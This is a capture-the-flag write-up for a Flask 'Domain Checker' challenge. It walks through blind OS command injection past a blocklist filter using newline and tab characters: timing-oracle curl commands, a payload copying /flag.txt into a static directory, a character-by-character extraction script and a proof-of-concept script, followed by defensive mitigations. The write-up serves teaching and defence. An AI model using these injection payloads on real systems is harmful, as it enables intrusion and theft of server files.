---
layout: writeup
title: "The Swiss Cheese Filter"
challenge: "The Swiss Cheese Filter"
category: "Web"
difficulty: "Medium"
tags: [command-injection, blind-injection, filter-bypass, newline-injection, flask]
---

# Challenge Overview

**The Swiss Cheese Filter** is a Flask-based "Domain Checker" application running on port 3000. User input is passed to a shell command (likely `nslookup`), but a character filter attempts to block injection. The filter has holes — like Swiss cheese — allowing **blind OS command injection** via newline (`\n`) and tab (`\t`) characters.

<div class="flag-box">KICTF{CMD_1NJ3CTION}</div>

---

## Initial Recon

The application exposes a domain lookup form:

```
POST /check
Content-Type: application/x-www-form-urlencoded

domain=example.com
```

Backend likely executes:
```bash
nslookup <user_input>
```

A character filter blocks common injection characters (`|`, `;`, `&`, `` ` ``, `$`, `(`, `)`), but **newlines** and **tabs** pass through.

---

## Vulnerability / Weakness

**OS Command Injection (CWE-78):** The `domain` parameter is concatenated into a shell command without proper sanitization. The filter uses a blocklist approach that misses critical characters:

| Character | Blocked? | Can inject? |
|-----------|----------|-------------|
| `;` | Yes | — |
| `\|` | Yes | — |
| `&` | Yes | — |
| `` ` `` | Yes | — |
| `$()` | Yes | — |
| `\n` (newline) | **No** | **Yes** |
| `\t` (tab) | **No** | **Yes** |

A newline terminates the `nslookup` command and starts a new shell command. Tabs serve as argument separators (equivalent to spaces in most shells).

```
┌───────────────────────────────────────────────────────┐
│                  INJECTION FLOW                        │
├───────────────────────────────────────────────────────┤
│                                                       │
│  User Input:                                          │
│    domain=example.com\n<cmd>\t<args>                  │
│                                                       │
│  Shell Expansion:                                     │
│  ┌──────────────────────────────────────┐             │
│  │ nslookup example.com                │  ← normal   │
│  │ <cmd>    <args>                      │  ← injected │
│  └──────────────────────────────────────┘             │
│                                                       │
│  Exfiltration via static file:                        │
│    cp\t/flag.txt\t/app/static/f.txt                   │
│    GET /static/f.txt → flag contents                  │
│                                                       │
└───────────────────────────────────────────────────────┘
```

---

## Exploitation Strategy

1. Confirm injection via `sleep` timing oracle
2. Use `\n` + `\t` to inject commands
3. Copy flag to a static-served directory
4. Retrieve flag via HTTP GET

---

## Exploitation Walkthrough

### Step 1: Confirm Blind Injection via Timing

```bash
# Baseline (no injection)
time curl -s -X POST http://<target>:3000/check \
  -d "domain=example.com"
# ~0.5s

# Timing oracle (sleep 5)
time curl -s -X POST http://<target>:3000/check \
  -d $'domain=example.com\nsleep\t5'
# ~5.5s  ← confirms execution!
```

The 5-second delay confirms the injected `sleep` command was executed.

### Step 2: Exfiltrate Flag via Static Directory

```bash
# Copy flag to publicly accessible directory
curl -s -X POST http://<target>:3000/check \
  -d $'domain=example.com\ncp\t/flag.txt\t/app/static/f.txt'

# Retrieve the flag
curl -s http://<target>:3000/static/f.txt
# KICTF{CMD_1NJ3CTION}
```

### Alternative: Character-by-Character Extraction

For scenarios where `cp` is unavailable, an ordinal-based blind extraction also works:

```python
import requests
import time

BASE = "http://<target>:3000"
flag = ""

for pos in range(1, 50):
    for c in range(32, 127):
        # If char matches, sleep 2
        payload = f'example.com\nif\t[\t$(cut\t-c{pos}\t/flag.txt)\t=\t{chr(c)}\t];\tthen\tsleep\t2;\tfi'
        start = time.time()
        requests.post(f"{BASE}/check", data={"domain": payload})
        elapsed = time.time() - start
        if elapsed > 1.5:
            flag += chr(c)
            print(f"[+] Position {pos}: {chr(c)} → {flag}")
            break
```

---

## Flag Extraction

```bash
$ curl -s http://<target>:3000/static/f.txt
KICTF{CMD_1NJ3CTION}
```

---

## Proof of Concept

```python
#!/usr/bin/env python3
"""Swiss Cheese Filter - Blind OS Command Injection"""

import requests

BASE = "http://<target>:3000"

# Inject: copy flag to static directory  
payload = "example.com\ncp\t/flag.txt\t/app/static/f.txt"
requests.post(f"{BASE}/check", data={"domain": payload})

# Retrieve flag
r = requests.get(f"{BASE}/static/f.txt")
print(f"[+] Flag: {r.text.strip()}")
```

---

## Lessons Learned

- **Blocklist-based input filters are inherently fragile.** Missing even one metacharacter (like newline) defeats the entire filter.
- **Blind injection** can be confirmed with timing oracles before attempting data exfiltration.
- **Tab characters** serve as valid argument separators in Unix shells, bypassing space-based filters.
- **Static file directories** in web frameworks provide convenient exfiltration endpoints for blind command injection.

---

## Defensive Takeaways

| Vulnerability | Mitigation |
|---|---|
| Command injection | Never pass user input to shell commands. Use subprocess with argument arrays (`subprocess.run(['nslookup', domain])`) |
| Blocklist filter bypass | Use allowlists (e.g., `^[a-zA-Z0-9.-]+$` for domains) instead of blocklists |
| Static dir write | Run application with minimal filesystem permissions; mount static dirs read-only |
| Timing oracle | Rate-limit and monitor anomalous response times |
